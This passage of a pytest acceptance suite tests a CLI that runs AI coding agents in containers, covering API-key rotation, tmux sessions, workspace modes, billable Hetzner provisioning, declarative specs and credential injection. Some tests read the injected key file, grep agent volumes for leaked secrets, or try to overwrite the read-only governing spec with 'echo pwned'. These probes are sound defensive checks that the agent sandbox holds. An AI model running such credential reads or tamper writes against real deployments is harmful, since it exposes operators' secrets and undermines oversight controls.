    outside the CI cost boundary. The unit tier proves the deploy key rides the
    same `--push-key` plumbing (test_per_repo_deploy_key_is_just_a_narrower_push_key)."""
    name = "accrot"
    work = acc.tmp
    state = work / "state"
    env_file = work / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n")
    old_val = "sk-ant-ROTATE-OLD-SECRET"
    new_val = "sk-ant-ROTATE-NEW-SECRET"
    key_file = _userconf(acc) / f"{name}.anthropic.key"
    key_file.write_text(old_val + "\n")
    inject_path = "/run/agent-container/apikeys/anthropic"
    compose_path = state / "agent-container" / "local" / f"{name}.compose.yaml"
    staged_path = state / "agent-container" / "local" / f"{name}.apikey.anthropic"

    def cli(*args, timeout=600):
        return subprocess.run(
            [*AGENT_CONTAINER, *args],
            env=_cli_env(state),
            cwd=str(work),  # so the project-local key file is discovered
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=timeout,
        )

    def _exec(*cmd):
        return subprocess.run(
            [RUNTIME, "exec", f"agent-container-{name}", *cmd], capture_output=True, text=True
        )

    try:
        r = cli("up", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        port = int((state / "agent-container" / "local" / f"{name}.port").read_text().strip())
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # Before rotation: the OLD value is what the ephemeral inject path serves.
        c = _exec("cat", inject_path)
        assert c.returncode == 0 and old_val in c.stdout, c.stdout

        # Operator rotates: edit the LOCAL file, then redeploy (no image/volume change).
        key_file.write_text(new_val + "\n")
        r = cli("redeploy", name, "--env-file", str(env_file))
        assert r.returncode == 0, r.stderr
        try:
            _wait_sshd(port)
        except AssertionError as e:
            raise AssertionError(f"{e}\n{_container_diag(name)}") from None

        # SC-006: the NEW value is in effect at the ephemeral inject path...
        c = _exec("cat", inject_path)
        assert c.returncode == 0 and new_val in c.stdout, c.stdout
        assert old_val not in c.stdout  # ...and the old value no longer served
        # ...no OLD (or new) value persisted onto any per-agent volume (FR-012)...
        for vol in ("/home/dev/.claude", "/home/dev/.codex", "/home/dev/.pi"):
            g = _exec("grep", "-rF", old_val, vol)
            assert g.returncode != 0, f"old secret survived rotation on {vol}:\n{g.stdout}"
            g = _exec("grep", "-rF", new_val, vol)
            assert g.returncode != 0, f"new secret leaked onto {vol}:\n{g.stdout}"
        # ...the compose file never inlines either value (referenced by path)...
        compose = compose_path.read_text()
        assert old_val not in compose and new_val not in compose
        # ...and the host-side staged copy was OVERWRITTEN with the new value (no
        # stale old copy left on the operator's machine either).
        staged = staged_path.read_text()
        assert new_val in staged and old_val not in staged
    finally:
        cli("wipe", name, "-y", timeout=120)


# --- Feature 004: execution modes, sessions, workspaces (real containers) ----
# The agent actually RESPONDING (SC-001, a real model call) is the opt-in/tokened
# extension and is NOT run here; these verify the mechanisms — the launch fires,
# sessions survive detach + report a dead session, headless propagates an exit
# code, and the three workspace modes behave per their durability — without a key.


def _logs_of(name: str) -> str:
    r = subprocess.run([RUNTIME, "logs", f"agent-container-{name}"], capture_output=True, text=True)
    return r.stdout + r.stderr


def test_interactive_launches_agent_in_a_window(acc):
    """US1/SC-001 (mechanism): interactive mode launches the chosen agent in a
    dedicated tmux window. The launch is observable in the entrypoint log even if
    the agent later exits for want of a model key (the response is the tokened bit)."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up(
        "acc4int", mode="interactive", agent="claude", authorized_key=[laptop.with_suffix(".pub")]
    )
    assert "launched agent 'claude'" in _logs_of("acc4int")


def test_detach_reattach_and_session_liveness(acc):
    """US2/SC-002/003 (FR-006/007/008): the session survives disconnect and a fresh
    connection reattaches to the same 'main'; once the session ends, the
    `tmux has-session` signal the attach probe reads flips to dead (the CLI's
    'nothing running' report off that signal is unit-covered — driving the real
    interactive attach here would hit host-key verification)."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acc4sess", authorized_key=[laptop.with_suffix(".pub")])
    # Two independent ssh connections = detach then reattach: 'main' persists.
    assert _ssh(port, laptop, "tmux has-session -t main && echo ALIVE").stdout.split() == ["ALIVE"]
    assert _ssh(port, laptop, "tmux has-session -t main && echo ALIVE").stdout.split() == ["ALIVE"]
    # End the session -> the probe's signal goes non-zero (dead), never a live 'main'.
    _ssh(port, laptop, "tmux kill-server")
    assert (
        _ssh(port, laptop, "tmux has-session -t main; echo rc=$?").stdout.strip().endswith("rc=1")
    )


def test_headless_foreground_propagates_exit_code(acc):
    """US3/SC-004 (mechanism, FR-002/004): a headless --foreground run returns
    control on completion and the CLI exit status IS the agent container's exit
    code. Without a model key the agent fails, so we assert a NON-ZERO code returns
    promptly (the success-not-resurrected side is the tokened extension)."""
    r = acc.up(
        "acc4hl", mode="headless", agent="claude", task="print ok", foreground=True, wait=False
    )
    assert r.returncode != 0  # the agent's failure surfaced as our exit code (SC-004)


def test_workspace_persistent_survives_recreate(acc):
    """US4/SC-006: a persistent workspace retains its working copy across down/up."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acc4pers", workspace="persistent", authorized_key=[laptop.with_suffix(".pub")])
    _ssh(port, laptop, "echo keep-me > /workspace/marker")
    acc.down("acc4pers")  # no --purge: the workspace volume is preserved
    port = acc.up("acc4pers", workspace="persistent", authorized_key=[laptop.with_suffix(".pub")])
    r = _ssh(port, laptop, "cat /workspace/marker")
    assert r.stdout.strip() == "keep-me"


def test_workspace_ephemeral_gone_after_teardown(acc):
    """US4/SC-006: an ephemeral workspace (container layer) does NOT survive."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acc4eph", workspace="ephemeral", authorized_key=[laptop.with_suffix(".pub")])
    _ssh(port, laptop, "echo transient > /workspace/marker")
    acc.down("acc4eph")
    port = acc.up("acc4eph", workspace="ephemeral", authorized_key=[laptop.with_suffix(".pub")])
    r = _ssh(port, laptop, "cat /workspace/marker 2>/dev/null; echo GONE")
    assert r.stdout.strip().splitlines()[-1] == "GONE"


def test_workspace_bind_reflects_local_dir(acc):
    """US4/SC-007: a bind workspace mounts the operator's LOCAL directory at
    /workspace — the container sees the host dir's contents. (The write-back
    direction depends on a writable Lima mount, a documented `--mount`
    prerequisite; the local-only refusal is unit-covered.)"""
    laptop = _gen_keypair(acc.tmp / "laptop")
    wsdir = acc.tmp / "bindwork"  # under the Lima-shared acc base
    wsdir.mkdir()
    (wsdir / "seed").write_text("host-side\n")  # a host file the bind must expose
    port = acc.up(
        "acc4bind",
        workspace="bind",
        workspace_dir=wsdir,
        authorized_key=[laptop.with_suffix(".pub")],
    )
    assert _ssh(port, laptop, "cat /workspace/seed").stdout.strip() == "host-side"


def test_clone_on_start_ssh_without_key_fails_fast(acc):
    """US4/SC-008 (FR-014): an SSH-URL clone with no injected push key fails BEFORE
    starting an empty-workspace agent (deterministic; no network)."""
    r = acc.up(
        "acc4clone",
        workspace="ephemeral",
        repo="git@github.com:you/private-repo.git",
        wait=False,
    )
    assert r.returncode != 0
    assert "push key" in r.stderr.lower() or "fr-014" in r.stderr.lower()


# --- Feature 005: shell integration (real containers) ------------------------


def test_attach_print_matches_the_live_target(acc):
    """US1/SC-001: `attach --print` emits the runnable ssh+tmux command with the
    LIVE deployment's coordinates (byte-for-byte what execute runs — parity is
    unit-proven — so running it verbatim reaches the same session). We assert the
    coordinates match the live port without tripping the test host's key verification."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("acc5print", authorized_key=[laptop.with_suffix(".pub")])
    state = acc.tmp / "state"
    r = _run_cli([*AGENT_CONTAINER, "attach", "acc5print", "--local", "--print"], state)
    assert r.returncode == 0, r.stderr
    assert r.stdout.strip() == f"ssh dev@localhost -p {port} -t tmux attach -t main"
    r2 = _run_cli([*AGENT_CONTAINER, "attach", "acc5print", "--local", "--ssh-config"], state)
    assert f"Port {port}" in r2.stdout and "RemoteCommand tmux attach -t main" in r2.stdout


@pytest.mark.skipif(
    RUNTIME != "docker", reason="host env DOCKER_CONTEXT eval test is docker-specific"
)
def test_host_env_eval_retargets_docker(acc):
    """US2/SC-002: `eval $(agent-container host env NAME)` sets DOCKER_CONTEXT so the
    operator's own docker lists that host's containers — with no tool wrapper."""
    acc.up("acc5env")
    state = acc.tmp / "state"
    ctx = subprocess.run(
        ["docker", "context", "show"], capture_output=True, text=True
    ).stdout.strip()
    cfg = _config_dir_of(state)
    cfg.mkdir(parents=True, exist_ok=True)
    cfg.joinpath("hosts.json").write_text(
        json.dumps(
            {
                "version": 1,
                "default": None,
                "hosts": {
                    "acc5envhost": {"driver": "docker", "context": ctx, "address": "localhost"}
                },
            }
        )
    )
    r = _run_cli([*AGENT_CONTAINER, "host", "env", "acc5envhost"], state)
    assert r.returncode == 0, r.stderr
    assert r.stdout.strip() == f"export DOCKER_CONTEXT={ctx}"
    # eval the EMITTED text in a real sh, then confirm docker targets that context.
    ps = subprocess.run(
        ["sh", "-c", 'eval "$1"; docker ps --format "{{.Names}}"', "_", r.stdout],
        env=_cli_env(state),
        capture_output=True,
        text=True,
    )
    assert "agent-container-acc5env" in ps.stdout


def test_host_rm_destroy_emptiness_guard_against_real_containers(acc, tmp_path):
    """US3 / SC-005 against REAL containers: `host rm --destroy` must refuse while
    ANY container is still present on the host, and release only once it is empty.
    Proves host_container_names actually reflects live daemon state (the unit tests
    stub it). No cloud call is ever made — we seed a tool-created hetzner-shaped host
    that points at the LOCAL daemon (context="", no `connection` so the ssh tunnel
    is a no-op), and pop HCLOUD_TOKEN so the emptiness-passed case fails at the token
    gate ('HCLOUD_TOKEN') rather than 'still present' — the deterministic tell that
    the guard released without deprovisioning anything."""

    driver = "podman" if "podman" in RUNTIME else "docker"
    config = tmp_path / "config" / "agent-container"
    config.mkdir(parents=True)
    reg = {
        "version": 1,
        "default": "acchz",
        "hosts": {
            "acchz": {
                "driver": driver,
                "context": "",  # the default local daemon — host_container_names sees acc's containers
                "address": "localhost",
                "provisioning": {"provider": "hetzner", "server_id": 999, "created": True},
                "created_by_tool": True,
            }
        },
    }
    (config / "hosts.json").write_text(json.dumps(reg))

    def host_rm_destroy():
        env = _cli_env(acc.tmp / "state")
        env["XDG_CONFIG_HOME"] = str(tmp_path / "config")
        env.pop("HCLOUD_TOKEN", None)  # never make a real cloud call from this test
        return subprocess.run(
            [*AGENT_CONTAINER, "host", "rm", "acchz", "--destroy", "-y"],
            env=env,
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=120,
        )

    acc.up("acchza")
    acc.up("acchzb")
    r = host_rm_destroy()
    assert r.returncode != 0 and "still present" in r.stderr, r.stderr  # refused: 2 present

    acc.down("acchza")
    r = host_rm_destroy()
    assert r.returncode != 0 and "still present" in r.stderr, r.stderr  # sibling still present

    acc.down("acchzb")
    r = host_rm_destroy()
    # Empty now: the guard released — it fails ONLY at the token gate, proving it got
    # past the emptiness check without touching (or destroying) a loaded server.
    assert r.returncode != 0, r.stdout
    assert "HCLOUD_TOKEN" in r.stderr and "still present" not in r.stderr, r.stderr


def test_host_rm_destroy_fails_closed_when_daemon_unreachable(tmp_path):
    """Fail-CLOSED at the real CLI (review #5): a tool-created host whose daemon
    cannot be reached (here a nonexistent docker context, so `ps` exits non-zero)
    must REFUSE --destroy — a failed enumeration is never read as 'empty', so an
    unreachable server is never destroyed. No containers, no cloud call (no token)."""
    driver = "podman" if "podman" in RUNTIME else "docker"
    config = tmp_path / "config" / "agent-container"
    config.mkdir(parents=True)
    reg = {
        "version": 1,
        "default": "deadhz",
        "hosts": {
            "deadhz": {
                "driver": driver,
                "context": "agent-container-nonexistent-xyz",  # no such context -> ps fails
                "address": "203.0.113.200",
                "provisioning": {"provider": "hetzner", "server_id": 777, "created": True},
                "created_by_tool": True,
            }
        },
    }
    (config / "hosts.json").write_text(json.dumps(reg))
    env = _cli_env(tmp_path / "state")
    env["XDG_CONFIG_HOME"] = str(tmp_path / "config")
    env.pop("HCLOUD_TOKEN", None)
    r = subprocess.run(
        [*AGENT_CONTAINER, "host", "rm", "deadhz", "--destroy", "-y"],
        env=env,
        capture_output=True,
        text=True,
        stdin=subprocess.DEVNULL,
        timeout=60,
    )
    assert r.returncode != 0, r.stdout
    assert "could not confirm" in r.stderr, r.stderr  # refused: enumeration failed, not "empty"


# --- Hetzner provisioning (US2) — OPT-IN, BILLABLE, never in CI ---------------
# Requires HCLOUD_TOKEN in the env; skips otherwise. Provisions a REAL server,
# verifies docker + compose came up (cloud-init), then destroys it in a finally
# so an assertion failure can never leave a billable orphan. Deletes ONLY the
# server it created (by the unique name / its own server_id) — never any other
# server in the project.

import importlib.util  # noqa: E402
from importlib.machinery import SourceFileLoader  # noqa: E402


def _load_cli():
    loader = SourceFileLoader("_ac_prov", str(SCRIPT_PATH))
    spec = importlib.util.spec_from_loader("_ac_prov", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


# Policy: CI/CD MUST NEVER provision real infrastructure or incur cost. This test
# is a developer-only, intentional, LOCAL action. The CI guard is belt-and-braces:
# it refuses to run under any CI runner even if a token is present in the env, so
# accidentally exposing HCLOUD_TOKEN to a workflow can't trigger a billable run.
_IN_CI = bool(os.environ.get("CI") or os.environ.get("GITHUB_ACTIONS"))


@pytest.mark.skipif(
    _IN_CI or not os.environ.get("HCLOUD_TOKEN"),
    reason="billable real provisioning — never runs in CI; opt-in locally via HCLOUD_TOKEN",
)
def test_hetzner_provision_deploy_destroy(tmp_path, monkeypatch):
    import json as _json

    name = "acc-hz"  # unique, RFC-1123; matches the created server + docker context name
    token = os.environ["HCLOUD_TOKEN"]

    state = tmp_path / "state"
    config = tmp_path / "config"
    state.mkdir()
    config.mkdir()
    # Point THIS process's cli at the same XDG dirs as the host-add subprocess, so
    # the in-process tunnel re-check below finds the automation key host-add wrote.
    monkeypatch.setenv("XDG_STATE_HOME", str(state))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(config))
    cli = _load_cli()
    env = dict(os.environ)

    # Overridable so a run can dodge a "resource_unavailable" placement (ARM/region
    # capacity varies). Default to a broadly-available x86 shared type.
    srv_type = os.environ.get("AGENT_CONTAINER_ACC_SERVER_TYPE", "cpx11")
    srv_loc = os.environ.get("AGENT_CONTAINER_ACC_LOCATION", "nbg1")
    add_argv = [
        *AGENT_CONTAINER,
        "host",
        "add",
        name,
        "--provider",
        "hetzner",
        "--create",
        "--server-type",
        srv_type,
        "--location",
        srv_loc,
    ]
    # Authorize a specific operator PUBLIC key when ~/.ssh/id_*.pub is absent
    # (e.g. a hardware/agent-backed key). AGENT_CONTAINER_SSH_PUBKEY = its path.
    pub = os.environ.get("AGENT_CONTAINER_SSH_PUBKEY")
    if pub:
        add_argv += ["--ssh-pubkey", pub]

    host: dict | None = None
    try:
        r = subprocess.run(add_argv, env=env, capture_output=True, text=True, timeout=900)
        # host add succeeding IS the end-to-end proof: the tool polled `docker
        # version` over the automation-key socket-forward until docker answered.
        assert r.returncode == 0, f"provision failed:\n{r.stderr}"
        reg = _json.loads((config / "agent-container" / "hosts.json").read_text())
        host = reg["hosts"][name]
        assert host["created_by_tool"] is True
        assert isinstance(host["provisioning"]["server_id"], int)
        assert host["provisioning"]["connection"] == "ssh-forward"
        assert isinstance(host["provisioning"]["automation_ssh_key_id"], int)
        assert host["context"] == "agent-container-acc-hz"
        # From a FRESH tunnel in THIS process (the provisioning tunnel is gone),
        # the compose v2 plugin answers over the forward — proving both the
        # socket-forward reconnects across invocations and compose is installed.
        cli.ensure_tunnel(host)
        ctx = host["context"]
        assert (
            subprocess.run(
                ["docker", "--context", ctx, "compose", "version"],
                capture_output=True,
                timeout=60,
            ).returncode
            == 0
        ), "compose plugin missing / socket-forward did not re-establish"
    finally:
        # ALWAYS destroy — primary path via the tool, then a hcloud fallback, so a
        # billable server is never left running even if the tool's teardown fails.
        if host is not None:
            try:
                cli.provisioner_destroy(host, token)
            except Exception as e:  # noqa: BLE001
                print(f"provisioner_destroy failed: {e}")
        if shutil.which("hcloud"):
            subprocess.run(["hcloud", "server", "delete", name], capture_output=True)


# --- Feature 006 declarative (agent-as-code) acceptance ----------------------
# Batches the deferred US1/US2 acceptance (T010/T013) with US3 (T016): a real
# `.agent-container/` project applies to a running container, the governing spec
# is read-only in-container (FR-020), a referenced credential is injected with no
# plaintext on disk (SC-004), and status→drift→converge→scoped-destroy holds.

_AAC_PROJECT = """\
environments:
  - name: {name}
    host: local
    container:
      mode: interactive
      agent: {agent}
      workspace: persistent
      env_file: ./ci.env
    credentials:
      - {{ name: MYSECRET, source: env, var: MYSECRET_SRC }}
"""


def _write_project(proj: Path, name: str, agent: str = "claude") -> None:
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        _AAC_PROJECT.format(name=name, agent=agent)
    )
    (proj / "ci.env").write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")


def test_declarative_apply_ro_spec_credential_drift_destroy(acc):
    name = "aacacc"
    secret = "sk-decl-acceptancevalue"  # env-file-clean (no space/quote/# to mangle)
    proj = acc.tmp / "aacproj"
    _write_project(proj, name, agent="claude")
    acc.register(name)  # ensure teardown even if an assertion fails mid-test
    env = {"MYSECRET_SRC": secret}

    # apply → the declared environment converges to a running container.
    r = acc.cli(["apply", "-y"], cwd=proj, extra_env=env)
    assert r.returncode == 0, f"apply failed:\n{r.stderr}"
    _wait_container_state(f"agent-container-{name}", "running")

    # T010 / FR-020: the governing spec is delivered READ-ONLY in-container — a
    # write must fail, and the in-container copy matches the host spec.
    w = _exec(name, ["sh", "-c", "echo pwned >> /workspace/.agent-container/environments.yaml"])
    assert w.returncode != 0, "FR-020 breach: the in-container spec was writable"
    shown = _exec(name, ["cat", "/workspace/.agent-container/environments.yaml"])
    assert shown.returncode == 0 and f"name: {name}" in shown.stdout

    # T013 / SC-004: the referenced credential reached the container as an env var,
    # and NO plaintext of the value appears anywhere in the tracked project dir.
    got = _exec(name, ["printenv", "MYSECRET"])
    assert got.returncode == 0 and got.stdout.strip() == secret
    on_disk = [p for p in proj.rglob("*") if p.is_file() and secret in p.read_text(errors="ignore")]
    assert on_disk == [], f"SC-004 breach: plaintext secret found in project dir: {on_disk}"

    # apply is idempotent — a matching spec makes no change (SC-002).
    r = acc.cli(["apply", "-y"], cwd=proj, extra_env=env)
    assert r.returncode == 0 and "no changes" in r.stderr

    # T016 / FR-008: change the declared config (agent) → status reports field-level
    # drift; apply converges (recreates) → status returns to matching.
    _write_project(proj, name, agent="codex")
    st = acc.cli(["status"], cwd=proj, extra_env=env)
    assert st.returncode == 0 and "drifted" in st.stderr and "agent" in st.stderr
    r = acc.cli(["apply", "-y"], cwd=proj, extra_env=env)
    assert r.returncode == 0, f"converge failed:\n{r.stderr}"
    _wait_container_state(f"agent-container-{name}", "running")
    assert _exec(name, ["printenv", "AGENT_CONTAINER_AGENT"]).stdout.strip() == "codex"
    st = acc.cli(["status"], cwd=proj, extra_env=env)
    assert "matching" in st.stderr and "drifted" not in st.stderr

    # T016 / SC-006/007: destroy removes ONLY the declared identity; an unrelated
    # imperative container is untouched. --deprovision on a REFERENCED host (local)
    # removes the container but NEVER the host (T019/FR-017, CI-safe — no cloud).
    acc.up("aacother")  # unrelated running container (registered for teardown by up)
    r = acc.cli(["destroy", "-y", "--deprovision"], cwd=proj, extra_env=env)
    assert r.returncode == 0, f"destroy --deprovision failed:\n{r.stderr}"
    _wait_container_state(f"agent-container-{name}", "")  # gone
    assert _container_state("agent-container-aacother") == "running"  # untouched
    # the referenced local host is unaffected — the daemon still serves containers
    assert RUNTIME and _container_state("agent-container-aacother") == "running"


# T019 (provisioned-host end-to-end) is REAL Hetzner — billable, MUST NOT run in CI.
# Opt in with HCLOUD_TOKEN + AGENT_CONTAINER_PROVISION_ACCEPTANCE=1 to exercise it.
@pytest.mark.skipif(
    not (os.environ.get("HCLOUD_TOKEN") and os.environ.get("AGENT_CONTAINER_PROVISION_ACCEPTANCE")),
    reason="real-Hetzner provisioning is billable/opt-in (set HCLOUD_TOKEN + "
    "AGENT_CONTAINER_PROVISION_ACCEPTANCE=1)",
)
def test_declarative_provisioned_host_hetzner(acc):
    name = "aacprov"
    hostname = "aac-prov-acc"  # RFC-1123 (no underscore)
    proj = acc.tmp / "provproj"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        f"environments:\n  - name: {name}\n"
        f"    host: {{ provision: hetzner, name: {hostname}, server_type: cx22, location: nbg1 }}\n"
        f"    container:\n      env_file: ./ci.env\n"
    )
    (proj / "ci.env").write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")
    acc.register(name)
    tok = {"HCLOUD_TOKEN": os.environ["HCLOUD_TOKEN"]}
    try:
        r = acc.cli(["apply", "-y"], cwd=proj, extra_env=tok, timeout=1200)
        assert r.returncode == 0, f"provisioned apply failed:\n{r.stderr}"
        assert f"provisioning host {hostname}" in r.stderr
        # the provisioned host is registered as tool-created
        show = acc.cli(["host", "show", hostname, "--json"], extra_env=tok)
        assert (
            '"created_by_tool": true' in show.stdout.replace(" ", "").replace("\n", "").lower()
            or '"created_by_tool":true' in show.stdout.lower()
        )
    finally:
        # destroy --deprovision removes the container AND the spec-created server.
        d = acc.cli(["destroy", "-y", "--deprovision"], cwd=proj, extra_env=tok, timeout=1200)
        assert d.returncode == 0, f"destroy --deprovision failed:\n{d.stderr}"
        gone = acc.cli(["host", "show", hostname, "--json"], extra_env=tok)
        assert gone.returncode != 0  # host removed from the registry after deprovision


# --- Feature 008: credential managers (real container) -----------------------
# The generic `command` resolver exercises the whole manager path end-to-end with a
# trivial resolver — no real manager CLI (and no account/secret) needed in CI.

# NOTE: the resolver argv is a pure LOCATOR — `printenv <VAR>` names where the secret
# lives, never the value itself (FR-013). Embedding the value here would put a secret in
# the tracked spec, which is precisely what this feature exists to prevent.
_CMD_CRED_PROJECT = """\
environments:
  - name: {name}
    host: local
    container:
      mode: interactive
      agent: claude
      workspace: persistent
      env_file: ./ci.env
    credentials:
      - {{ name: MYSECRET, source: command, argv: ["printenv", "RESOLVER_SRC_008"] }}
"""


def test_declarative_command_source_injects_without_plaintext(acc):
    """T007 / SC-001+SC-002: a credential fetched by a resolver reaches the container,
    no plaintext lands in the project, and a failing resolver aborts before any change."""
    name = "aac008"
    secret = "sk-from-resolver-008"
    proj = acc.tmp / "cred008"
    (proj / ".agent-container").mkdir(parents=True)
    spec_file = proj / ".agent-container" / "environments.yaml"
    spec_file.write_text(_CMD_CRED_PROJECT.format(name=name))
    (proj / "ci.env").write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")
    acc.register(name)
    # The secret lives ONLY in the operator's environment; the spec names the variable.
    env = {"RESOLVER_SRC_008": secret}

    r = acc.cli(["apply", "-y"], cwd=proj, extra_env=env)
    assert r.returncode == 0, f"apply failed:\n{r.stderr}"
    _wait_container_state(f"agent-container-{name}", "running")

    # the resolver's value reached the container (trailing newline stripped, FR-012)...
    got = _exec(name, ["printenv", "MYSECRET"])
    assert got.returncode == 0 and got.stdout.strip() == secret
    # ...and no plaintext anywhere in the tracked project or the tool's output (SC-001)
    on_disk = [p for p in proj.rglob("*") if p.is_file() and secret in p.read_text(errors="ignore")]
    assert on_disk == [], f"SC-001 breach: plaintext in project dir: {on_disk}"
    assert secret not in r.stdout and secret not in r.stderr

    # SC-002: a resolver that fails aborts before any change, naming the credential.
    # Uses a FRESH environment: an already-matching one is an idempotent no-op that
    # never re-resolves, so it could not exercise the failure path.
    bad_name = "aac008b"
    bad_proj = acc.tmp / "cred008bad"
    (bad_proj / ".agent-container").mkdir(parents=True)
    (bad_proj / ".agent-container" / "environments.yaml").write_text(
        _CMD_CRED_PROJECT.format(name=bad_name).replace(
            '["printenv", "RESOLVER_SRC_008"]', '["printenv", "NO_SUCH_VAR_008"]'
        )
    )
    (bad_proj / "ci.env").write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")
    acc.register(bad_name)
    bad = acc.cli(["apply", "-y"], cwd=bad_proj, extra_env=env)
    assert bad.returncode != 0, "a failing resolver must abort the apply"
    assert "MYSECRET" in bad.stderr  # names the failing credential
    assert "unlocked" in bad.stderr  # carries the remediation hint (FR-006)
    assert _container_state(f"agent-container-{bad_name}") == ""  # nothing was created


def test_declarative_encrypted_source_refused_with_migration(acc):
    """T010 / SC-003: the removed `encrypted` source is refused before any change,
    with an actionable migration rather than a generic enum error."""
    proj = acc.tmp / "cred008mig"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: aac008mig\n    host: local\n"
        "    credentials:\n"
        "      - { name: K, source: encrypted, path: ./k.age, decrypt: 'age -d' }\n"
    )
    r = acc.cli(["status"], cwd=proj)
    assert r.returncode != 0
    assert "REMOVED" in r.stderr and "onepassword" in r.stderr
    assert "is not one of" not in r.stderr


# --- Feature 009: the agent-operable surface (real container) -----------------
# T014a — plan.md promised a real-invocation test; the analyze pass found it
# missing from the task list. SC-001 ("an agent completes a full lifecycle using
# ONLY machine-readable output") is an end-to-end claim and cannot be proven by
# hermetic units alone.


def _json_cli(acc, argv, **kw):
    """Run the real CLI with --json and return (parsed_stdout, CompletedProcess)."""
    r = acc.cli([*argv, "--json"], **kw)
    try:
        return json.loads(r.stdout), r
    except json.JSONDecodeError as e:  # stdout must ALWAYS be a clean envelope
        raise AssertionError(
            f"stdout did not parse as JSON for {argv}: {e}\nstdout={r.stdout!r}\nstderr={r.stderr[-500:]!r}"
        ) from None


def test_agent_drives_full_lifecycle_over_json(acc):
    """SC-001/SC-002/SC-003: a full lifecycle on machine-readable output alone."""
    name = "acc009"
    acc.register(name)
    env_file = acc.tmp / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")

    # up --json: valid envelope, nothing but the envelope on stdout (FR-002)
    payload, r = _json_cli(acc, ["up", name, "--env-file", str(env_file)])
    assert r.returncode == 0, r.stderr
    assert payload["schema"] == "agent-container/v1" and payload["ok"] is True
    _wait_container_state(f"agent-container-{name}", "running")

    # list --json: the environment is visible to an agent
    payload, r = _json_cli(acc, ["list"])
    assert r.returncode == 0 and payload["ok"] is True

    # a failure yields a PARSEABLE descriptor with a stable code (SC-002)
    payload, r = _json_cli(acc, ["stop", name, "--host", "nosuchhost009"])
    assert r.returncode != 0
    assert payload["ok"] is False
    err = payload["error"]
    assert err["code"] == "host_not_registered"  # branch on the CODE, not the message
    assert err["entity"] == "nosuchhost009" and err["remedy"]

    # SC-003: a destructive command refuses on a non-TTY rather than hanging
    r = acc.cli(["down", name, "--purge"])  # no -y, not a terminal
    assert r.returncode != 0 and "-y" in r.stderr

    # tear down with explicit authorization
    payload, r = _json_cli(acc, ["down", name, "--purge", "-y"])
    assert r.returncode == 0 and payload["ok"] is True
    _wait_container_state(f"agent-container-{name}", "")


def test_context_and_skill_over_json(acc):
    """The two new commands work against a real environment; context leaks nothing."""
    payload, r = _json_cli(acc, ["context"])
    assert r.returncode == 0 and payload["ok"] is True
    data = payload["data"]
    assert {"target", "stages", "hosts", "conventions", "next_step"} <= set(data)

    # skill installs into a scratch PROJECT dir, is idempotent, and removes cleanly
    proj = acc.tmp / "skillproj"
    proj.mkdir()
    payload, r = _json_cli(acc, ["skill", "install"], cwd=proj)
    assert r.returncode == 0 and payload["data"]["changed"] is True
    skill_md = proj / ".claude" / "skills" / "agent-container" / "SKILL.md"
    assert skill_md.is_file()
    body = skill_md.read_text()
    assert body.startswith("---\n") and "name: agent-container" in body
    # FR-012c: every example in the shipped skill carries --json
    examples = [ln.strip() for ln in body.splitlines() if ln.strip().startswith("agent-container ")]
    assert examples and all("--json" in e for e in examples)

    payload, _ = _json_cli(acc, ["skill", "install"], cwd=proj)
    assert payload["data"]["changed"] is False  # idempotent
    payload, _ = _json_cli(acc, ["skill", "remove"], cwd=proj)
    assert payload["data"]["changed"] is True
    assert not skill_md.exists()


# --- Feature 010: opencode as a fourth agent (real container) ----------------


@pytest.mark.parametrize("agent", ["claude", "codex", "pi", "opencode"])
def test_every_supported_agent_launches_in_its_own_tmux_window(acc, agent):
    """US1 acceptance 1+4 / FR-004 / SC-007. Parametrised over ALL FOUR rather
    than opencode alone: FR-014 requires the existing three be unchanged, and
    SC-007 had no acceptance coverage otherwise. One list, no special cases."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    name = f"acc10w{agent[:4]}"
    acc.up(name, agent=agent, authorized_key=[laptop.with_suffix(".pub")])
    windows = _exec(name, ["tmux", "list-windows", "-t", "main", "-F", "#{window_name}"])
    assert agent in windows.stdout.split(), windows.stdout
    acc.down(name, purge=True)
    assert acc.volumes_of(name) == []  # FR-008: no orphaned storage, any agent


def test_opencode_headless_propagates_the_agent_exit_code(acc):
    """US1 acceptance 2 / FR-005. Probed against the real binary first (research
    R5): with a PRESENT-but-invalid key opencode fails and exits non-zero. Note
    the negative case is the meaningful one — with NO key opencode SUCCEEDS via a
    default model, which is why the FR-005 probe had to be split in two."""
    r = acc.up(
        "acc10hl",
        mode="headless",
        agent="opencode",
        task="print ok",
        foreground=True,
        wait=False,
        env_extra=["ANTHROPIC_API_KEY=sk-ant-invalid-acceptance-000"],
    )
    assert r.returncode != 0, f"expected the agent's failure to surface:\n{r.stdout}\n{r.stderr}"


def test_opencode_persists_config_and_credentials_across_recreate(acc):
    """US1 acceptance 3 / FR-006 / SC-002. Asserts BOTH native locations. Checking
    only the config file is exactly the failure the discarded single-volume design
